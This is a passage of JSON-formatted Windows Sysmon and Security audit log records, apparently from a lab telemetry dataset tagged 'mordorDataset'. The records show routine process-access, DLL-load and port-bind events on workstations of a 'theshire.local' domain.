{39e4a257-f725-5f87-2c00-000000000400}\r\nSourceProcessId: 1936\r\nSourceThreadId: 2020\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {39e4a257-f724-5f87-2500-000000000400}\r\nTargetProcessId: 1672\r\nTargetImage: C:\\windows\\system32\\svchost.exe\r\nGrantedAccess: 0x3000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+305fe|c:\\windows\\system32\\sysmain.dll+44b1f|c:\\windows\\system32\\sysmain.dll+1e899|c:\\windows\\system32\\sysmain.dll+1e7be|c:\\windows\\system32\\sysmain.dll+1e6a5|c:\\windows\\system32\\sysmain.dll+1e509|c:\\windows\\system32\\sysmain.dll+1c32b|c:\\windows\\system32\\sysmain.dll+1bf95|c:\\windows\\system32\\sysmain.dll+74b0d|c:\\windows\\system32\\sysmain.dll+73b32|c:\\windows\\system32\\sysmain.dll+601a3|C:\\windows\\system32\\svchost.exe+314c|C:\\windows\\System32\\sechost.dll+2de2|C:\\windows\\System32\\KERNEL32.DLL+17c24|C:\\windows\\SYSTEM32\\ntdll.dll+6cea1", "Hostname": "WORKSTATION5", "TargetProcessId": "1672", "TargetImage": "C:\\windows\\system32\\svchost.exe", "SourceProcessGUID": "{39e4a257-f725-5f87-2c00-000000000400}"}
{"ImageLoaded": "C:\\Windows\\System32\\gdi32full.dll", "SeverityValue": 2, "EventReceivedTime": "2020-09-18 13:09:00", "EventID": 7, "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "ExecutionProcessID": 3392, "Channel": "Microsoft-Windows-Sysmon/Operational", "host": "wec.internal.cloudapp.net", "AccountType": "User", "ProcessGuid": "{d273d0f0-e945-5f64-3f01-000000000800}", "Opcode": "Info", "EventTime": "2020-09-18 13:07:17", "Signed": "true", "SourceModuleType": "im_msvistalog", "AccountName": "SYSTEM", "Domain": "NT AUTHORITY", "@version": "1", "OpcodeValue": 0, "SignatureStatus": "Valid", "Severity": "INFO", "Hashes": "SHA1=F7A63E3541F18A55EB874AAD899373D0C6EDED74,MD5=9B9E9E68B817D79F296AB1CCF378D017,SHA256=1CF582623B0CB3868554E78574B599F39B10B5CA4A51FA898F89286DDD15CE13,IMPHASH=4D32F6E2211CD04CA28C2CD4FAC607E8", "SourceName": "Microsoft-Windows-Sysmon", "Description": "GDI Client DLL", "Category": "Image loaded (rule: ImageLoad)", "Company": "Microsoft Corporation", "Keywords": -9223372036854775808, "FileVersion": "10.0.18362.1082 (WinBuild.160101.0800)", "UserID": "S-1-5-18", "ThreadID": 5552, "EventType": "INFO", "@timestamp": "2020-09-18T17:09:00.552Z", "port": 64545, "RecordNumber": 1724755, "Task": 7, "Signature": "Microsoft Windows", "SourceModuleName": "eventlog", "Version": 3, "Product": "Microsoft® Windows® Operating System", "Image": "C:\\Windows\\System32\\taskhostw.exe", "OriginalFileName": "gdi32", "UtcTime": "2020-09-18 17:07:17.035", "Hostname": "WORKSTATION6.theshire.local", "RuleName": "-", "tags": ["mordorDataset"]}
{"@version": "1", "EventType": "AUDIT_SUCCESS", "Version": 0, "ThreadID": 1824, "EventTime": "2020-08-07 11:07:36", "Task": 12810, "SourcePort": "49754", "Channel": "Security", "SourceName": "Microsoft-Windows-Security-Auditing", "OpcodeValue": 0, "Hostname": "WORKSTATION6.theshire.local", "@timestamp": "2020-08-07T15:07:38.165Z", "Message": "The Windows Filtering Platform has permitted a bind to a local port.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t1492\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\svchost.exe\r\n\r\nNetwork Information:\r\n\tSource Address:\t\t::\r\n\tSource Port:\t\t49754\r\n\tProtocol:\t\t17\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t0\r\n\tLayer Name:\t\tResource Assignment\r\n\tLayer Run-Time ID:\t36", "Category": "Filtering Platform Connection", "Opcode": "Info", "SourceModuleName": "eventlog", "ProcessId": "1492", "EventReceivedTime": "2020-08-07 11:07:38", "port": 60122, "Application": "\\device\\harddiskvolume2\\windows\\system32\\svchost.exe", "ExecutionProcessID": 4, "host": "wec.internal.cloudapp.net", "Severity": "INFO", "LayerRTID": "36", "LayerName": "%%14608", "SeverityValue": 2, "EventID": 5158, "SourceAddress": "::", "ProviderGuid": "{54849625-5478-4994-A5BA-3E3B0328C30D}", "RecordNumber": 236720, "SourceModuleType": "im_msvistalog", "Keywords": -9214364837600034816, "FilterRTID": "0", "Protocol": "17", "tags": ["mordorDataset"]}
